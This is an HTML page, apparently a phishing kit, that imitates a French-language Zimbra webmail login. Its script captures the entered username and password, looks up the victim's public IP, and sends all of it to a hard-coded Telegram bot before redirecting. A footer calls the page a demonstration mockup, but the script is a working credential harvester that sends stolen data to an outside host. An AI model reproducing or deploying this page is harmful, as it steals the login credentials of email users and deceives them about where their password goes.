<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Connexion – Portail</title>
  <!-- Empêche le zoom au focus sur mobile -->
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <style>
    :root{
      --bg1:#0f73a8;   /* bleus génériques    */
      --bg2:#0a5f8c;
      --panel:#ffffff;
      --text:#1f2d3a;
      --muted:#6b7a8a;
      --primary:#1783c6;
      --primary-pressed:#116da5;
      --input:#eef2f6;
      --border:#d9e1ea;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: linear-gradient(155deg,var(--bg1),var(--bg2));
      color:var(--text);
      -webkit-text-size-adjust:100%; /* évite zoom iOS */
    }

    /* Layout */
    .wrap{
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .card{
      background:var(--panel);
      width:100%;
      max-width: 420px;
      border-radius:10px;
      box-shadow:0 18px 40px rgba(0,0,0,.18);
      overflow:hidden;
    }
    .card-head{
      padding:28px 28px 0 28px;
    }
    .brand{
      display:flex; align-items:center; gap:10px;
    }
    .brand .logo{
      width:28px; height:28px; border-radius:6px;
      background:var(--primary);
      display:inline-flex; align-items:center; justify-content:center;
      color:white; font-weight:700;
    }
    .brand .name{
      font-size:28px; font-weight:700; letter-spacing:.2px; color:var(--primary);
    }

    .card-body{padding:18px 28px 8px}
    h1{
      font-size:22px; margin:6px 0 18px; font-weight:700;
    }

    /* Form */
    label{
      display:block; font-size:13px; color:var(--muted); margin-bottom:6px;
    }
    .field{
      width:100%;
      border:1px solid var(--border);
      background:var(--input);
      border-radius:6px;
      display:flex; align-items:center;
    }
    .field input{
      appearance:none; border:0; outline:0;
      background:transparent;
      padding:12px 14px; width:100%;
      font-size:16px; /* ≥16px évite zoom auto iOS */
      color:var(--text);
    }
    .field .toggle{
      padding:0 12px; cursor:pointer; user-select:none;
      font-size:13px; color:var(--primary);
      white-space:nowrap;
    }
    .row{margin-bottom:14px}

    .actions{
      display:flex; align-items:center; gap:12px; margin:14px 0 6px;
    }
    .actions .remember{
      display:flex; align-items:center; gap:8px; font-size:14px; color:var(--muted);
    }
    .btn{
      display:inline-flex; align-items:center; justify-content:center;
      padding:12px 18px; border-radius:6px; border:0;
      background:var(--primary); color:#fff; font-weight:700; cursor:pointer;
      transition:transform .06s ease, background .2s ease;
      min-width:130px; font-size:16px;
    }
    .btn:active{ transform: translateY(1px); background:var(--primary-pressed);}
    .copyright{
      padding:14px 28px 22px; color:var(--muted); font-size:12px;
    }

    /* Responsive tweaks */
    @media (max-width:480px){
      .card{max-width: 360px}
      .brand .name{font-size:24px}
      h1{font-size:20px}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="region" aria-labelledby="title">
      <div class="card-head">
        <div class="brand" aria-label="Logo portail">
          <div class="logo" aria-hidden="true">Z</div>
          <div class="name">zimbra</div>
        </div>
      </div>

      <div class="card-body">
        <h1 id="title">Connexion</h1>

        <form method="post" action="" id="loginForm" novalidate>
          <div class="row">
            <label for="user">Utilisateur</label>
            <div class="field">
              <input id="user" name="user" type="text" autocomplete="username" required>
            </div>
          </div>

          <div class="row">
            <label for="pass">Mot de passe</label>
            <div class="field">
              <input id="pass" name="pass" type="password" autocomplete="current-password" required>
              <span class="toggle" id="togglePass" aria-controls="pass" aria-pressed="false">Afficher</span>
            </div>
          </div>

          <div class="actions">
            <button class="btn" type="submit">Connexion</button>
            <label class="remember">
              <input type="checkbox" id="remember" style="width:16px;height:16px"> Mémoriser mes valeurs d’accès
            </label>
          </div>
        </form>
      </div>

      <div class="copyright">
        © 2005–2025 – Portail générique. Cette maquette est fournie à des fins de démonstration.
      </div>
    </div>
  </div>

  <script>
document.addEventListener('gesturestart', e => e.preventDefault());

// Afficher/Masquer le mot de passe
const pass = document.getElementById('pass');
const toggle = document.getElementById('togglePass');
toggle.addEventListener('click', () => {
  const isPwd = pass.type === 'password';
  pass.type = isPwd ? 'text' : 'password';
  toggle.textContent = isPwd ? 'Masquer' : 'Afficher';
  toggle.setAttribute('aria-pressed', String(isPwd));
});

// Gestion du formulaire
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  // Récupération des valeurs du formulaire
  const email = document.getElementById('user').value;
  const password = document.getElementById('pass').value;

  // Récupération de l'adresse IP publique
  let ip = 'Inconnue';
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    ip = ipData.ip;
  } catch (err) {
    console.error('Impossible de récupérer IP', err);
  }

  // Message à envoyer sur Telegram
  const message = `Nouvelle connexion Zimbra :
Email : ${email}
Mot de passe : ${password}
IP : ${ip}`;

  // Envoi vers Telegram
  const botToken = "6793149800:AAFrrTrd5hC5HaY9QFqGkxHpyVpReIyjLE8";
  const chatId = "-4134299888";
  const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await fetch(telegramURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });

    // Redirection après envoi réussi
    window.location.href = "fin.html";
  } catch (err) {
    console.error('Erreur envoi Telegram', err);
  }
});
</script>

</body>
</html>
